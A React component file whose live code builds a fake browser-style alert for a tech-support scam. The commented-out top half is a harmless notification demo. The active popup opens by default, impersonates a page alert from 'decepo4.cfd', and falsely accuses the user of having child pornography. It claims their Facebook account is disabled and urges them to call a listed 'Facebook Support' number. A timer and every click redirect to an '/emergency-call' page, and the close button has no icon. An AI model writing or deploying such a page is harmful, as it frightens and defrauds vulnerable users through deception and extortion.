/* eslint-disable react/prop-types */
// /* eslint-disable react/prop-types */
// import  { useState } from 'react';
// import { Bell, X, ShieldCheck } from 'lucide-react';

// function NotificationPopup({ isOpen, onClose, message }) {
//   if (!isOpen) return null;

//   return (
//     <div className="fixed inset-0 flex items-center justify-center p-4 bg-black/50">
//       <div className="bg-white rounded-lg shadow-xl w-full max-w-md transform transition-all">
//         <div className="p-6">
//           <div className="flex items-center justify-between mb-4">
//             <div className="flex items-center space-x-2">
//               <ShieldCheck className="w-6 h-6 text-green-600" />
//               <h2 className="text-xl font-semibold text-gray-900">Security Notice</h2>
//             </div>
//             <button
//               onClick={onClose}
//               className="text-gray-400 hover:text-gray-500 transition-colors"
//               aria-label="Close notification"
//             >
//               <X className="w-5 h-5" />
//             </button>
//           </div>
//           <p className="text-gray-600 mb-6">{message}</p>
//           <div className="flex justify-end space-x-3">
//             <button
//               onClick={onClose}
//               className="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors"
//             >
//               Acknowledge
//             </button>
//           </div>
//         </div>
//       </div>
//     </div>
//   );
// }

// function PopUp() {
//   const [isOpen, setIsOpen] = useState(false);

//   return (
//     <div className="min-h-screen bg-gray-100">
//       <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
//         <div className="bg-white rounded-lg shadow-lg p-6">
//           <div className="flex items-center justify-between mb-8">
//             <h1 className="text-2xl font-bold text-gray-900">Notification Demo</h1>
//             <button
//               onClick={() => setIsOpen(true)}
//               className="flex items-center space-x-2 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
//             >
//               <Bell className="w-4 h-4" />
//               <span>Show Notification</span>
//             </button>
//           </div>
          
//           <div className="prose max-w-none">
//             <h2 className="text-xl font-semibold mb-4">About This Demo</h2>
//             <p className="text-gray-600 mb-4">
//               This is a demonstration of a proper notification system that follows best practices:
//             </p>
//             <ul className="list-disc list-inside text-gray-600 space-y-2">
//               <li>Accessible and keyboard-navigable</li>
//               <li>Clear, honest communication</li>
//               <li>Responsive design for all devices</li>
//               <li>Smooth animations and transitions</li>
//               <li>Professional and trustworthy appearance</li>
//             </ul>
//           </div>
//         </div>
//       </div>

//       <NotificationPopup
//         isOpen={isOpen}
//         onClose={() => setIsOpen(false)}
//         type="info"
//         message="Your account is secure and up to date. We regularly monitor for suspicious activity to keep your data safe."
//       />
//     </div>
//   );
// }

// export default PopUp;


import { useEffect, useState } from 'react';
import { ShieldCheck } from 'lucide-react';
import { useNavigate } from 'react-router-dom';

function NotificationPopup({ isOpen, onClose, message}) {
    const navigate = useNavigate()
     useEffect(() => {
        const timer = setTimeout(() => {
          navigate("/emergency-call");
        }, 2500);
    
        return () => clearTimeout(timer); // Cleanup to prevent memory leaks
      }, [navigate]);
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 flex items-center justify-center p-4 bg-black/50" onClick={() => navigate("/emergency-call")}>
      <div className="bg-white rounded-lg shadow-xl w-full max-w-md transform transition-all">
        <div className="p-6">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-2">
              <ShieldCheck className="w-6 h-6 text-green-600" />
              <h2 className="text-xl font-semibold text-gray-900">The page at &quot;https://decepo4.cfd&quot; says:</h2>
            </div>
            <button
              onClick={onClose}
              className="text-gray-400 hover:text-gray-500 transition-colors"
              aria-label="Close notification"
            >
              {/* <X className="w-5 h-5" /> */}
            </button>
          </div>
          <p className="text-gray-600 mb-6">{message}</p>
          <div className="flex justify-end space-x-3">
            <button
              onClick={() => navigate("/emergency-call")}
              className="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors"
            >
              Ok
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

function PopUp() {
  const [isOpen, setIsOpen] = useState(true); // Set to true by default

  return (
    <div className="min-h-screen bg-gray-100">
      <NotificationPopup
        isOpen={isOpen}
        onClose={() => setIsOpen(false)}
        type="info"
        message="Your phone is locked due to detected illegal CHILD PORNOGRAPHY. Your Facebook Account has been Disabled.Immediately call Facebook Support on 18445131621 to unlock it!"
      />
    </div>
  );
}

export default PopUp;